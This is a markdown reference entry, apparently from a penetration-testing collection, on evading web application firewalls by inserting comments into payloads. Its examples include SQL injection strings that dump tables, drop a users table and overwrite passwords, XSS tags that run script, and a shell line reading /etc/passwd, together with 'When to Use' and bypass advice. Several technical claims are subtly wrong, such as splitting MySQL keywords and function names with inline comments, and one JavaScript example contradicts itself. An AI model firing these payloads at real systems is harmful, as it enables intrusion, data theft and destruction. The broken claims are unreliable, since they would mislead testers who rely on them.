---
id: WAF-EVASION-07
title: Using Comments in Payloads
category: Evasion Techniques
severity_range: Low-Critical
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-07: Using Comments in Payloads

## Summary

Comment insertion is one of the most widely used WAF evasion techniques. By embedding comment delimiters within keywords, operators, or expressions, attackers can break the string matching patterns that WAF signatures rely on, while the target parser (SQL engine, browser, shell) strips or ignores the comment content.

## When to Use

- Against regex-based WAFs that match contiguous character sequences (e.g., `union select`, `<script>`)
- When the WAF lacks inline comment preprocessing or normalization
- For SQL injection where the database engine supports inline comments (`/**/`)
- For XSS where HTML/XML parsers tolerate comments in unexpected positions
- Against custom WAF rules that don't account for comment-based obfuscation

## Technique Details

**SQL inline comments** (`/**/`) can be inserted between SQL keywords, operators, and even inside identifiers in MySQL. The SQL parser discards the comment content entirely.

**HTML comments** (`<!-- -->`) can appear in certain positions within HTML tags but are less flexible than SQL comments for keyword splitting.

**JavaScript comments** (`//`, `/* */`) can split function names and method calls if the application evaluates the string through `eval()` or similar mechanisms.

## Payload Examples

```sql
-- SQL inline comment evasion
un/**/ion sel/**/ect 1,2,3 fr/**/om users
SEL/**/ECT * FR/**/OM users WHE/**/RE id=1
INSE/**/RT INT/**/O users VAL/**/UES (1,'admin','pass')
DRO/**/P TAB/**/LE users
upd/**/ate users set pass/**/word='hacked' where id=1

-- Comments between operators
1'/**/OR/**/1=1--
1'/**/UNION/**/SELECT/**/null,table_name/**/FROM/**/information_schema.tables--

-- MySQL-specific: comments inside function calls
EXP/**/(@@version)
BENCH/**/MARK(1000000,MD5(1))
```

```html
<!-- HTML comment obfuscation (limited positions) -->
<!--[if IE]><script>alert(1)</script><![endif]-->

<!-- Comments in unexpected tag positions -->
<img<!-- --> src=x onerror=alert(1)>
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
```

```javascript
// JavaScript comment evasion (for eval-based execution)
eval("al" + "er" + "t(1)")  // no comments needed, but can be combined
eval("al/*comment*/ert(1)")  // blocks execution

// Multi-line comments
alert(1)/*comment*/alert(2)  // executes both
```

```bash
# Shell command comments
cat /etc/passwd #comment after command
```

## Detection & Bypass Notes

**Detection:**
- WAFs that strip all comment content before matching (e.g., removing `/\*.*?\*/` patterns) are resistant.
- ModSecurity CRS includes specific rules to detect and block comment-based obfuscation.
- AST-based WAFs parse the query structure and are immune to comment-based keyword splitting.

**Bypass:**
- Nest comments inside other comments where supported (`/**/***/**/`).
- Use multi-line comments with varying content (random hex, base64) to evade content-based detection.
- Combine with case toggling: `UN/**/ION SEL/**/ECT` provides two layers of obfuscation.
- Some databases use alternative comment syntax (`--`, `#`, `--+`) that can be layered.
- For MySQL, comments can replace whitespace entirely: `UN/**/ION/**/SEL/**/ECT/**/1`.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://dev.mysql.com/doc/refman/8.0/en/comments.html
- https://portswigger.net/web-security/sql-injection
